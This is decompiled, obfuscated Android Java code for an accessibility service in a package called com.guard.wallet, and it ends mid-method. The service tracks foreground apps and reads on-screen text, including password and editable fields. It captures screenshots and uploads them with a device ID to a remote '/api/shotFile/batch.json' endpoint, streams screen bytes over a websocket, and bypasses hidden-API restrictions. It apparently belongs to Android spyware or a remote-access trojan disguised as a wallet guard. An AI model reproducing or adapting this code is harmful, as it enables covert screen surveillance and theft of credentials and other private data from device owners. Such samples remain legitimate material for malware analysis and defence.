package com.guard.wallet.service;

import a1.q;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Rect;
import android.graphics.drawable.BitmapDrawable;
import android.os.Build.VERSION;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import com.guard.wallet.MainApplication;
import com.guard.wallet.entity.NoticeRootChangedVO;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.ReadScreenNodeInfo;
import com.guard.wallet.entity.ReadScreenWindow;
import com.guard.wallet.entity.RootInActiveWindowResult;
import com.guard.wallet.entity.TakeScreenShotResult;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.entity.UiObjectCollection;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.http.e0;
import com.guard.wallet.http.l;
import com.guard.wallet.req.ContainerEventVO;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.req.UploadFileVO;
import com.guard.wallet.server.c;
import com.guard.wallet.thread.k;
import com.guard.wallet.utils.d;
import com.guard.wallet.utils.e;
import com.guard.wallet.utils.g;
import com.guard.wallet.utils.h;
import d0.a;
import e1.b;
import java.lang.reflect.Field;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.ListIterator;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;
import o.b0;
import o.c0;
import o.g0;
import org.lsposed.hiddenapibypass.i;

public class MyAccessibilityService extends AccessibilityDelegateManager {
   public static final AtomicReference p = new AtomicReference(null);
   public static final AtomicBoolean q = new AtomicBoolean(false);
   public static final AtomicBoolean r = new AtomicBoolean(false);
   public static final AtomicReference s = new AtomicReference(null);
   public static final AtomicReference t = new AtomicReference(null);
   public static final AtomicReference u = new AtomicReference(null);
   public static final AtomicReference v = new AtomicReference(null);
   public static final AtomicReference w = new AtomicReference(null);
   public final AtomicInteger k = new AtomicInteger(0);
   public final ReentrantLock l = new ReentrantLock();
   public a m;
   public final AtomicBoolean n = new AtomicBoolean(false);
   public ThreadPoolExecutor o;

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static String E(AccessibilityEvent var0) {
      Exception var10000;
      label61: {
         StringBuilder var1;
         try {
            if (var0.getText().isEmpty()) {
               return null;
            }

            var1 = new StringBuilder();
            var9 = var0.getText().iterator();
         } catch (Exception var4) {
            var10000 = var4;
            boolean var10001 = false;
            break label61;
         }

         while (true) {
            CharSequence var2;
            try {
               if (!var9.hasNext()) {
                  break;
               }

               var2 = (CharSequence)var9.next();
            } catch (Exception var8) {
               var10000 = var8;
               boolean var11 = false;
               break label61;
            }

            if (var2 != null) {
               label47: {
                  try {
                     if (a1.q.B(var1.toString())) {
                        break label47;
                     }
                  } catch (Exception var7) {
                     var10000 = var7;
                     boolean var12 = false;
                     break label61;
                  }

                  try {
                     var1.append(",");
                  } catch (Exception var6) {
                     var10000 = var6;
                     boolean var13 = false;
                     break label61;
                  }
               }

               try {
                  var1.append(var2);
               } catch (Exception var5) {
                  var10000 = var5;
                  boolean var14 = false;
                  break label61;
               }
            }
         }

         try {
            return var1.toString();
         } catch (Exception var3) {
            var10000 = var3;
            boolean var15 = false;
         }
      }

      Exception var10 = var10000;
      a1.q.s("MyAccessibilityService", var10);
      return null;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static boolean I(UiObject var0) {
      AtomicReference var4 = p;
      if (var4.get() != null && com.guard.wallet.utils.e.j() && var0 != null && var0.source() != null) {
         Exception var10000;
         label59: {
            int var1;
            try {
               var1 = VERSION.SDK_INT;
            } catch (Exception var9) {
               var10000 = var9;
               boolean var10001 = false;
               break label59;
            }

            if (var1 >= 33) {
               try {
                  if (((MyAccessibilityService)var4.get()).isNodeInCache(var0.source())) {
                     ((MyAccessibilityService)var4.get()).clearCachedSubtree(var0.source());
                  }
               } catch (Exception var8) {
                  var10000 = var8;
                  boolean var11 = false;
                  break label59;
               }
            }

            boolean var3;
            try {
               var3 = Z(var0.source());
            } catch (Exception var7) {
               var10000 = var7;
               boolean var12 = false;
               break label59;
            }

            boolean var2 = var3;
            if (!var3) {
               var2 = var3;
               if (var1 > 30) {
                  try {
                     var2 = K(var0.source());
                  } catch (Exception var6) {
                     var10000 = var6;
                     boolean var13 = false;
                     break label59;
                  }
               }
            }

            if (!var2) {
               return false;
            }

            try {
               return var0.source().refresh();
            } catch (Exception var5) {
               var10000 = var5;
               boolean var14 = false;
            }
         }

         Exception var10 = var10000;
         a1.q.s("clearCachedNode:", var10);
      }

      return false;
   }

   public static boolean K(AccessibilityNodeInfo var0) {
      if (var0 != null) {
         try {
            if (VERSION.SDK_INT >= 28) {
               org.lsposed.hiddenapibypass.i.a(AccessibilityNodeInfo.class, var0, "setSealed", Boolean.TRUE);
            }
         } catch (Exception var2) {
            a1.q.s("MyAccessibilityService", var2);
         }
      }

      return Z(var0);
   }

   public static UiObjectCollection L(CombineFilter var0) {
      try {
         AtomicReference var1 = s;
         if (var1.get() != null) {
            return ((UiObject)var1.get()).findByCombine(var0);
         }
      } catch (Exception var2) {
         a1.q.s("MyAccessibilityService", var2);
      }

      return null;
   }

   public static UiObject M(CombineFilter var0) {
      try {
         AtomicReference var1 = s;
         if (var1.get() != null) {
            return ((UiObject)var1.get()).findOneByCombine(var0);
         }
      } catch (Exception var2) {
         a1.q.s("MyAccessibilityService", var2);
      }

      return null;
   }

   public static String N() {
      return (String)u.get();
   }

   public static Rect O() {
      int var0;
      Rect var1;
      try {
         AtomicReference var2 = t;
         if (var2.get() == null || ((AccessibilityNodeInfo)var2.get()).getWindow() == null) {
            return null;
         }

         var1 = new Rect();
         ((AccessibilityNodeInfo)var2.get()).getWindow().getBoundsInScreen(var1);
         if (var1.width() <= 0) {
            return null;
         }

         var0 = var1.height();
      } catch (Exception var3) {
         a1.q.s("MyAccessibilityService", var3);
         return null;
      }

      return var0 > 0 ? var1 : null;
   }

   public static MyAccessibilityService P() {
      return (MyAccessibilityService)p.get();
   }

   public static UiObject Q() {
      return (UiObject)s.get();
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static boolean Z(AccessibilityNodeInfo var0) {
      boolean var2 = false;
      boolean var1 = var2;
      if (var0 != null) {
         var1 = var2;

         Exception var10000;
         label34: {
            try {
               if (VERSION.SDK_INT < 28) {
                  return var1;
               }

               var5 = org.lsposed.hiddenapibypass.i.a(AccessibilityNodeInfo.class, var0, "isSealed");
            } catch (Exception var4) {
               var10000 = var4;
               boolean var10001 = false;
               break label34;
            }

            var1 = var2;

            try {
               if (var5 instanceof Boolean) {
                  var1 = (Boolean)var5;
               }

               return var1;
            } catch (Exception var3) {
               var10000 = var3;
               boolean var7 = false;
            }
         }

         Exception var6 = var10000;
         a1.q.s("MyAccessibilityService", var6);
         var1 = var2;
      }

      return var1;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static void a0(byte[] var0) {
      Exception var10000;
      label126: {
         label127: {
            c var3;
            try {
               if (Integer.valueOf(com.guard.wallet.server.c.G().y.size()) <= 0) {
                  break label127;
               }

               var3 = com.guard.wallet.server.c.G();
               var3.getClass();
            } catch (Exception var11) {
               var10000 = var11;
               boolean var10001 = false;
               break label126;
            }

            label104:
            if (var0 != null) {
               label128: {
                  int var1;
                  try {
                     var1 = var0.length;
                  } catch (Exception var14) {
                     var10000 = var14;
                     boolean var24 = false;
                     break label128;
                  }

                  if (var1 <= 0) {
                     break label104;
                  }

                  try {
                     var18 = var3.y;
                  } catch (Exception var10) {
                     var10000 = var10;
                     boolean var25 = false;
                     break label126;
                  }

                  try {
                     if (var18.isEmpty()) {
                        break label104;
                     }

                     var19 = var18.iterator();
                  } catch (Exception var13) {
                     var10000 = var13;
                     boolean var26 = false;
                     break label128;
                  }

                  while (true) {
                     try {
                        if (!var19.hasNext()) {
                           break label104;
                        }

                        ((b)var19.next()).a(var0);
                     } catch (Exception var12) {
                        var10000 = var12;
                        boolean var27 = false;
                        break;
                     }
                  }
               }

               Exception var20 = var10000;

               try {
                  a1.q.s("MyWebSocketServer", var20);
               } catch (Exception var9) {
                  var10000 = var9;
                  boolean var28 = false;
                  break label126;
               }
            }
         }

         com.guard.wallet.bridge.a var21;
         try {
            var21 = a1.q.d;
         } catch (Exception var8) {
            var10000 = var8;
            boolean var29 = false;
            break label126;
         }

         boolean var2;
         boolean var16;
         label88: {
            label87: {
               var2 = true;
               if (var21 != null) {
                  try {
                     if (var21.w.get()) {
                        break label87;
                     }
                  } catch (Exception var7) {
                     var10000 = var7;
                     boolean var30 = false;
                     break label126;
                  }
               }

               var16 = false;
               break label88;
            }

            var16 = true;
         }

         if (!var16 || var0 == null) {
            return;
         }

         try {
            if (var0.length <= 0) {
               return;
            }

            var21 = a1.q.d;
         } catch (Exception var6) {
            var10000 = var6;
            boolean var31 = false;
            break label126;
         }

         label75: {
            label74: {
               if (var21 != null) {
                  try {
                     if (var21.w.get()) {
                        break label74;
                     }
                  } catch (Exception var5) {
                     var10000 = var5;
                     boolean var32 = false;
                     break label126;
                  }
               }

               var16 = false;
               break label75;
            }

            var16 = var2;
         }

         if (!var16) {
            return;
         }

         try {
            a1.q.d.B(var0);
            return;
         } catch (Exception var4) {
            var10000 = var4;
            boolean var33 = false;
         }
      }

      Exception var15 = var10000;
      a1.q.s("MyAccessibilityService", var15);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static void e0(AccessibilityNodeInfo var0, int var1, int var2, ReadScreenWindow var3) {
      if (var0 != null) {
         Exception var10000;
         label91: {
            label92: {
               try {
                  if (!var0.isVisibleToUser()
                     || var0.getText() == null && var0.getContentDescription() == null && !var0.isEditable() && !var0.isPassword() && var0.getChildCount() != 0
                     )
                   {
                     break label92;
                  }
               } catch (Exception var14) {
                  var10000 = var14;
                  boolean var10001 = false;
                  break label91;
               }

               ReadScreenNodeInfo var5;
               try {
                  var5 = new ReadScreenNodeInfo(var1, var2);
                  Rect var4 = new Rect();
                  var0.getBoundsInScreen(var4);
                  com.guard.wallet.helper.a.c(var4);
                  var5.setBoundsInScreen(var4);
                  var5.setWidth(var4.width());
                  var5.setHeight(var4.height());
                  Point var6 = new Point(var4.exactCenterX(), var4.exactCenterY());
                  var5.setCenterInScreen(var6);
                  if (var0.getPackageName() != null) {
                     var5.setPackageName(var0.getPackageName().toString());
                  }
               } catch (Exception var11) {
                  var10000 = var11;
                  boolean var17 = false;
                  break label91;
               }

               try {
                  if (var0.getClassName() != null) {
                     var5.setClassName(var0.getClassName().toString());
                  }
               } catch (Exception var13) {
                  var10000 = var13;
                  boolean var18 = false;
                  break label91;
               }

               try {
                  if (var0.getText() != null) {
                     var5.setText(var0.getText().toString());
                  }
               } catch (Exception var10) {
                  var10000 = var10;
                  boolean var19 = false;
                  break label91;
               }

               try {
                  if (var0.getContentDescription() != null) {
                     var5.setDesc(var0.getContentDescription().toString());
                  }
               } catch (Exception var12) {
                  var10000 = var12;
                  boolean var20 = false;
                  break label91;
               }

               try {
                  var3.getChildren().add(var5);
               } catch (Exception var9) {
                  var10000 = var9;
                  boolean var21 = false;
                  break label91;
               }
            }

            try {
               if (var0.getChildCount() <= 0) {
                  return;
               }
            } catch (Exception var8) {
               var10000 = var8;
               boolean var22 = false;
               break label91;
            }

            var2 = 0;

            while (true) {
               try {
                  if (var2 >= var0.getChildCount()) {
                     return;
                  }

                  e0(var0.getChild(var2), var1 + 1, var2, var3);
               } catch (Exception var7) {
                  var10000 = var7;
                  boolean var23 = false;
                  break;
               }

               var2++;
            }
         }

         Exception var15 = var10000;
         a1.q.s("MyAccessibilityService", var15);
      }
   }

   public static AccessibilityNodeInfo m0(AccessibilityNodeInfo var0) {
      if (var0 != null) {
         try {
            if (var0.getParent() == null) {
               return var0;
            }

            var0.recycle();
            return m0(var0.getParent());
         } catch (Exception var2) {
            a1.q.s("MyAccessibilityService", var2);
         }
      }

      return var0;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static TakeScreenShotResult n0(k var0, boolean var1) {
      Exception var10000;
      label115: {
         LinkedList var5;
         try {
            var5 = new LinkedList();
            var5.add(Executors.newFixedThreadPool(2).submit(var0));
         } catch (Exception var19) {
            var10000 = var19;
            boolean var10001 = false;
            break label115;
         }

         TakeScreenShotResult var3 = null;

         label109:
         while (true) {
            ListIterator var6;
            try {
               if (var5.isEmpty()) {
                  return var3;
               }

               var6 = var5.listIterator();
            } catch (Exception var11) {
               var10000 = var11;
               boolean var29 = false;
               break;
            }

            TakeScreenShotResult var20 = var3;

            while (true) {
               while (true) {
                  boolean var2;
                  try {
                     var2 = var6.hasNext();
                  } catch (Exception var9) {
                     var10000 = var9;
                     boolean var30 = false;
                     break label109;
                  }

                  var3 = var20;
                  if (!var2) {
                     continue label109;
                  }

                  Exception var4;
                  label118: {
                     try {
                        Future var24 = (Future)var6.next();
                        if (!var24.isDone()) {
                           continue;
                        }

                        var3 = (TakeScreenShotResult)var24.get();
                     } catch (Exception var18) {
                        var4 = var18;
                        break label118;
                     }

                     label119: {
                        try {
                           var6.remove();
                        } catch (Exception var17) {
                           var10000 = var17;
                           boolean var31 = false;
                           break label119;
                        }

                        var20 = var3;
                        if (var3 == null) {
                           continue;
                        }

                        var20 = var3;

                        try {
                           if (var3.getSaveBytesResult() == null) {
                              continue;
                           }
                        } catch (Exception var16) {
                           var10000 = var16;
                           boolean var32 = false;
                           break label119;
                        }

                        var20 = var3;

                        try {
                           if (var3.getSaveBytesResult().length <= 0) {
                              continue;
                           }
                        } catch (Exception var15) {
                           var10000 = var15;
                           boolean var33 = false;
                           break label119;
                        }

                        var20 = var3;
                        if (!var1) {
                           continue;
                        }

                        String var8;
                        try {
                           var26 = var3.getSaveBytesResult();
                           String var21 = com.guard.wallet.http.l.a;
                           var8 = com.guard.wallet.utils.h.l("deviceId");
                        } catch (Exception var14) {
                           var10000 = var14;
                           boolean var34 = false;
                           break label119;
                        }

                        var20 = var3;

                        try {
                           if (a1.q.B(var8)) {
                              continue;
                           }
                        } catch (Exception var13) {
                           var10000 = var13;
                           boolean var35 = false;
                           break label119;
                        }

                        var20 = var3;
                        if (var26 == null) {
                           continue;
                        }

                        var20 = var3;

                        try {
                           if (var26.length <= 0) {
                              continue;
                           }

                           e0 var23 = new e0();
                           UploadFileVO var7 = new UploadFileVO(var8, "100016");
                           com.guard.wallet.http.i var27 = new com.guard.wallet.http.i();
                           var27.k(var7, "/api/shotFile/batch.json", null, var26, var23);
                           break;
                        } catch (Exception var12) {
                           var10000 = var12;
                           boolean var36 = false;
                        }
                     }

                     var4 = var10000;
                     var20 = var3;
                  }

                  try {
                     a1.q.s("MyAccessibilityService", var4);
                  } catch (Exception var10) {
                     var10000 = var10;
                     boolean var37 = false;
                     break label109;
                  }
               }

               var20 = var3;
            }
         }
      }

      Exception var22 = var10000;
      a1.q.s("MyAccessibilityService", var22);
      return null;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static BitmapDrawable o0() {
      Object var2 = null;

      Exception var10000;
      label129: {
         TakeScreenShotResult var15;
         label112: {
            label111: {
               label110: {
                  label109: {
                     x.a var3;
                     label119: {
                        try {
                           if (VERSION.SDK_INT >= 30) {
                              break label110;
                           }

                           var3 = x.a.b();
                           var1 = var3.e;
                           if (!var1.tryLock()) {
                              break label111;
                           }

                           if (!var3.c()) {
                              break label119;
                           }
                        } catch (Exception var14) {
                           var10000 = var14;
                           boolean var10001 = false;
                           break label129;
                        }

                        int var0 = (int)100.0F;

                        try {
                           var23 = (Bitmap)var3.g.a.get();
                        } catch (Exception var13) {
                           var10000 = var13;
                           boolean var26 = false;
                           break label129;
                        }

                        if (var23 != null) {
                           try {
                              byte[] var24 = com.guard.wallet.utils.g.M0(var23, 1.0F, var0);
                              var1.unlock();
                              var15 = new TakeScreenShotResult(null, var24);
                              break label112;
                           } catch (Exception var12) {
                              var10000 = var12;
                              boolean var27 = false;
                              break label129;
                           }
                        }
                        break label109;
                     }

                     try {
                        var3.f();
                     } catch (Exception var11) {
                        var10000 = var11;
                        boolean var28 = false;
                        break label129;
                     }
                  }

                  try {
                     var1.unlock();
                     break label111;
                  } catch (Exception var10) {
                     var10000 = var10;
                     boolean var29 = false;
                     break label129;
                  }
               }

               try {
                  k var16 = new k(1.0F);
                  var15 = n0(var16, false);
                  break label112;
               } catch (Exception var9) {
                  var10000 = var9;
                  boolean var30 = false;
                  break label129;
               }
            }

            var15 = null;
         }

         if (var15 == null) {
            return null;
         }

         try {
            if (var15.getSaveBytesResult() == null || var15.getSaveBytesResult().length <= 0) {
               return null;
            }

            var17 = var15.getSaveBytesResult();
         } catch (Exception var8) {
            var10000 = var8;
            boolean var31 = false;
            break label129;
         }

         label82: {
            if (var17 != null) {
               try {
                  if (var17.length > 0) {
                     var19 = BitmapFactory.decodeByteArray(var17, 0, var17.length);
                     break label82;
                  }
               } catch (Exception var7) {
                  Exception var18 = var7;

                  try {
                     a1.q.s("BitmapUtils", var18);
                  } catch (Exception var6) {
                     var10000 = var6;
                     boolean var32 = false;
                     break label129;
                  }
               }
            }

            var19 = null;
         }

         if (var19 == null) {
            return null;
         }

         BitmapDrawable var25;
         try {
            var25 = new BitmapDrawable(var19);
            var25.setAlpha(255);
         } catch (Exception var5) {
            Exception var20 = var5;

            try {
               a1.q.s("BitmapUtils", var20);
            } catch (Exception var4) {
               var10000 = var4;
               boolean var33 = false;
               break label129;
            }

            return (BitmapDrawable)var2;
         }

         return var25;
      }

      Exception var21 = var10000;
      a1.q.s("MyAccessibilityService", var21);
      return null;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static TakeScreenShotResult u0() {
      Object var1 = null;

      Exception var10000;
      label73: {
         ReentrantLock var2;
         x.a var3;
         label62: {
            try {
               if (VERSION.SDK_INT < 30) {
                  var3 = x.a.b();
                  var2 = var3.e;
                  break label62;
               }
            } catch (Exception var9) {
               var10000 = var9;
               boolean var10001 = false;
               break label73;
            }

            try {
               k var0 = new k(false);
               return n0(var0, true);
            } catch (Exception var8) {
               var10000 = var8;
               boolean var14 = false;
               break label73;
            }
         }

         Object var10 = var1;

         label50: {
            label49: {
               try {
                  if (!var2.tryLock()) {
                     return (TakeScreenShotResult)var10;
                  }

                  if (!var3.c()) {
                     break label49;
                  }

                  var11 = (Bitmap)var3.g.a.get();
               } catch (Exception var7) {
                  var10000 = var7;
                  boolean var15 = false;
                  break label73;
               }

               if (var11 != null) {
                  try {
                     byte[] var12 = com.guard.wallet.utils.g.M0(var11, 0.5F, 80);
                     var2.unlock();
                     TakeScreenShotResult var19 = new TakeScreenShotResult(null, var12);
                     return var19;
                  } catch (Exception var6) {
                     var10000 = var6;
                     boolean var16 = false;
                     break label73;
                  }
               }
               break label50;
            }

            try {
               var3.f();
            } catch (Exception var5) {
               var10000 = var5;
               boolean var17 = false;
               break label73;
            }
         }

         try {
            var2.unlock();
         } catch (Exception var4) {
            var10000 = var4;
            boolean var18 = false;
            break label73;
         }

         return (TakeScreenShotResult)var1;
      }

      Exception var13 = var10000;
      a1.q.s("MyAccessibilityService", var13);
      return null;
   }

   public final void F(int var1) {
      if (var1 > 0) {
         try {
            if (this.k.addAndGet(var1) >= 2 && MainApplication.getInstance() != null) {
               MainApplication.getInstance().offerStrategyEvent("LOAD_LISTEN_WINDOW_FINISHED");
            }
         } catch (Exception var3) {
            a1.q.s("MyAccessibilityService", var3);
         }
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void G(AccessibilityEvent var1) {
      if (var1 != null) {
         Exception var10000;
         label379: {
            try {
               if (var1.getEventType() <= 0) {
                  return;
               }
            } catch (Exception var50) {
               var10000 = var50;
               boolean var10001 = false;
               break label379;
            }

            int var2;
            try {
               var2 = var1.getEventType();
            } catch (Exception var49) {
               var10000 = var49;
               boolean var82 = false;
               break label379;
            }

            if (var2 != 32 && var2 != 16384) {
               if (var2 != 2048) {
                  return;
               }

               ConcurrentLinkedQueue var5 = super.c;

               CharSequence var6;
               try {
                  if (var5.isEmpty()) {
                     return;
                  }

                  var6 = var1.getPackageName();
               } catch (Exception var44) {
                  var10000 = var44;
                  boolean var83 = false;
                  break label379;
               }

               boolean var3;
               label362: {
                  label361:
                  if (var6 != null) {
                     label382: {
                        try {
                           var6 = var6.toString();
                        } catch (Exception var48) {
                           var10000 = var48;
                           boolean var84 = false;
                           break label382;
                        }

                        label352: {
                           try {
                              if (a1.q.B(var6)) {
                                 break label361;
                              }
                           } catch (Exception var46) {
                              var10000 = var46;
                              boolean var85 = false;
                              break label352;
                           }

                           try {
                              var3 = var5.contains(var6);
                              break label362;
                           } catch (Exception var45) {
                              var10000 = var45;
                              boolean var86 = false;
                           }
                        }

                        Exception var60 = var10000;

                        try {
                           a1.q.s("com.guard.wallet.service.AccessibilityDelegateManager", var60);
                           break label361;
                        } catch (Exception var47) {
                           var10000 = var47;
                           boolean var87 = false;
                        }
                     }

                     Exception var61 = var10000;

                     try {
                        a1.q.s("com.guard.wallet.service.AccessibilityDelegateManager", var61);
                     } catch (Exception var43) {
                        var10000 = var43;
                        boolean var88 = false;
                        break label379;
                     }
                  }

                  var3 = false;
               }

               if (!var3) {
                  return;
               }
            }

            RootInActiveWindowResult var9;
            AccessibilityNodeInfo var11;
            try {
               var9 = this.R();
               var11 = var9.getCurRoot();
            } catch (Exception var42) {
               var10000 = var42;
               boolean var89 = false;
               break label379;
            }

            AtomicReference var10 = s;

            Object var62;
            try {
               var62 = (AtomicReference)var10.get();
            } catch (Exception var41) {
               var10000 = var41;
               boolean var90 = false;
               break label379;
            }

            if (var62 != null) {
               try {
                  if (!Objects.equals(var11, ((UiObject)var10.get()).source()) && ((UiObject)var10.get()).isRootRecycle()) {
                     Log.d("MyAccessibilityService", "Active root node will recycle");
                     ((UiObject)var10.get()).recycle();
                  }
               } catch (Exception var40) {
                  var10000 = var40;
                  boolean var91 = false;
                  break label379;
               }
            }

            label328:
            if (var11 != null) {
               try {
                  var62 = var11.getPackageName();
               } catch (Exception var38) {
                  var10000 = var38;
                  boolean var92 = false;
                  break label328;
               }

               Object var8 = null;
               String var7;
               if (var62 != null) {
                  try {
                     var7 = var11.getPackageName().toString();
                  } catch (Exception var37) {
                     var10000 = var37;
                     boolean var93 = false;
                     break label328;
                  }
               } else {
                  var7 = null;
               }

               label315: {
                  try {
                     if (var11.getClassName() != null) {
                        var62 = var11.getClassName().toString();
                        break label315;
                     }
                  } catch (Exception var36) {
                     var10000 = var36;
                     boolean var94 = false;
                     break label328;
                  }

                  var62 = null;
               }

               String var12;
               try {
                  var12 = this.T();
               } catch (Exception var35) {
                  var10000 = var35;
                  boolean var95 = false;
                  break label328;
               }

               AtomicReference var13;
               AtomicReference var14;
               String var72;
               var13 = v;
               var14 = u;
               var72 = (String)var62;
               label303:
               if (var2 == 2048) {
                  try {
                     StringBuilder var73 = new StringBuilder("窗口内容更新作为窗口状态变化:");
                     var73.append(var1.getPackageName().toString());
                     Log.d("MyAccessibilityService", var73.toString());
                  } catch (Exception var33) {
                     var10000 = var33;
                     boolean var96 = false;
                     break label328;
                  }

                  var72 = (String)var62;

                  try {
                     if (!Objects.equals(var7, var14.get())) {
                        break label303;
                     }
                  } catch (Exception var34) {
                     var10000 = var34;
                     boolean var97 = false;
                     break label328;
                  }

                  var72 = (String)var62;

                  try {
                     if (!a1.q.B(var13.get())) {
                        var72 = (String)var13.get();
                     }
                  } catch (Exception var32) {
                     var10000 = var32;
                     boolean var98 = false;
                     break label328;
                  }
               }

               String var51;
               if (var2 != 32 && var2 != 16384) {
                  var51 = var72;
               } else {
                  var62 = var8;

                  try {
                     if (var1.getClassName() != null) {
                        var62 = var1.getClassName().toString();
                     }
                  } catch (Exception var31) {
                     var10000 = var31;
                     boolean var99 = false;
                     break label328;
                  }

                  var51 = (String)var62;
               }

               boolean var54;
               label279: {
                  label386: {
                     label387: {
                        try {
                           if (Objects.equals(var7, "com.android.systemui") && Objects.equals(var51, "android.view.View")) {
                              break label386;
                           }
                        } catch (Exception var30) {
                           var10000 = var30;
                           boolean var100 = false;
                           break label387;
                        }

                        try {
                           if (Objects.equals(var51, this.getPackageName().concat(".LockActivity"))) {
                              break label386;
                           }
                        } catch (Exception var29) {
                           var10000 = var29;
                           boolean var101 = false;
                           break label387;
                        }

                        try {
                           var54 = Objects.equals(var51, "com.google.guard".concat(".LockActivity"));
                           break label279;
                        } catch (Exception var28) {
                           var10000 = var28;
                           boolean var102 = false;
                        }
                     }

                     var62 = var10000;

                     try {
                        a1.q.s("MyAccessibilityService", (Exception)var62);
                     } catch (Exception var27) {
                        var10000 = var27;
                        boolean var103 = false;
                        break label328;
                     }

                     var54 = false;
                     break label279;
                  }

                  var54 = true;
               }

               if (var54) {
                  return;
               }

               try {
                  var62 = t;
                  if (!var11.equals(var62.get())) {
                     Log.d("MyAccessibilityService", "当前视图根节点已变化");
                  }
               } catch (Exception var26) {
                  var10000 = var26;
                  boolean var104 = false;
                  break label328;
               }

               try {
                  if (var14.get() != null) {
                     StringBuilder var74 = new StringBuilder("上一个运行包名 old activePackageName:");
                     var74.append((String)var14.get());
                     Log.d("MyAccessibilityService", var74.toString());
                  }
               } catch (Exception var25) {
                  var10000 = var25;
                  boolean var105 = false;
                  break label328;
               }

               try {
                  if (var13.get() != null) {
                     StringBuilder var75 = new StringBuilder("上一个运行窗口 old activeWindowClassName:");
                     var75.append(var13);
                     Log.d("MyAccessibilityService", var75.toString());
                  }
               } catch (Exception var24) {
                  var10000 = var24;
                  boolean var106 = false;
                  break label328;
               }

               try {
                  if (!a1.q.B(var51)) {
                     StringBuilder var76 = new StringBuilder("当前视图栈顶节点:");
                     var76.append(var51);
                     Log.d("MyAccessibilityService", var76.toString());
                  }
               } catch (Exception var23) {
                  var10000 = var23;
                  boolean var107 = false;
                  break label328;
               }

               try {
                  var54 = Objects.equals(var14.get(), var7);
               } catch (Exception var22) {
                  var10000 = var22;
                  boolean var108 = false;
                  break label328;
               }

               AtomicReference var77 = w;
               boolean var4;
               if (!var54) {
                  try {
                     var14.set(var7);
                     var13.set(var51);
                     var77.set(var12);
                  } catch (Exception var20) {
                     var10000 = var20;
                     boolean var109 = false;
                     break label328;
                  }

                  var54 = true;
                  var4 = true;
               } else {
                  label240: {
                     label239: {
                        try {
                           if (this.l(com.guard.wallet.utils.g.v0(var7, var51, o.e.class.getName())) && !Objects.equals(var13.get(), var51)) {
                              var13.set(var51);
                              var77.set(var12);
                              break label239;
                           }
                        } catch (Exception var21) {
                           var10000 = var21;
                           boolean var110 = false;
                           break label328;
                        }

                        var54 = false;
                        var4 = false;
                        break label240;
                     }

                     var4 = true;
                     var54 = false;
                  }
               }

               try {
                  this.H(var54, var4);
                  var8 = UiObject.createRoot(var11);
                  var62.set(var11);
                  var10.set(var8);
                  if (!a1.q.B(var14.get())) {
                     StringBuilder var68 = new StringBuilder("当前运行包名已变化 new rootPackageName:");
                     var68.append((String)var14.get());
                     Log.d("MyAccessibilityService", var68.toString());
                  }
               } catch (Exception var19) {
                  var10000 = var19;
                  boolean var111 = false;
                  break label328;
               }

               try {
                  if (!a1.q.B(var13.get())) {
                     StringBuilder var69 = new StringBuilder("当前运行窗口已变化 new windowClassName:");
                     var69.append((String)var13.get());
                     Log.d("MyAccessibilityService", var69.toString());
                  }
               } catch (Exception var18) {
                  var10000 = var18;
                  boolean var112 = false;
                  break label328;
               }

               try {
                  if (!a1.q.B(var77.get())) {
                     StringBuilder var70 = new StringBuilder("当前运行窗口已变化 new windowTitle:");
                     var70.append((String)var77.get());
                     Log.d("MyAccessibilityService", var70.toString());
                  }
               } catch (Exception var17) {
                  var10000 = var17;
                  boolean var113 = false;
                  break label328;
               }

               try {
                  var4 = this.i0(var7, var51, var12, var9.isComplete());
                  var54 = this.h0((String)var14.get(), (String)var13.get(), (String)var77.get(), var9.isComplete());
                  if (var10.get() == null) {
                     return;
                  }

                  var52 = (UiObject)var10.get();
               } catch (Exception var16) {
                  var10000 = var16;
                  boolean var114 = false;
                  break label328;
               }

               if (!var54 && !var4) {
                  var54 = true;
               } else {
                  var54 = false;
               }

               try {
                  var52.setRootRecycle(var54);
                  return;
               } catch (Exception var15) {
                  var10000 = var15;
                  boolean var115 = false;
               }
            } else {
               try {
                  Log.d("MyAccessibilityService", "root is Null");
                  return;
               } catch (Exception var39) {
                  var10000 = var39;
                  boolean var116 = false;
               }
            }
         }

         Exception var53 = var10000;
         a1.q.s("changeRootInActiveWindow", var53);
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void H(boolean var1, boolean var2) {
      Exception var10000;
      AtomicReference var4 = t;
      label98:
      if (var1) {
         int var3;
         try {
            var3 = VERSION.SDK_INT;
         } catch (Exception var11) {
            var10000 = var11;
            boolean var10001 = false;
            break label98;
         }

         if (var3 >= 33) {
            try {
               this.clearCache();
            } catch (Exception var10) {
               var10000 = var10;
               boolean var21 = false;
               break label98;
            }
         }

         try {
            if (var4.get() == null) {
               return;
            }
         } catch (Exception var9) {
            var10000 = var9;
            boolean var22 = false;
            break label98;
         }

         if (var3 >= 33) {
            try {
               this.clearCachedSubtree((AccessibilityNodeInfo)var4.get());
            } catch (Exception var8) {
               var10000 = var8;
               boolean var23 = false;
               break label98;
            }
         }

         try {
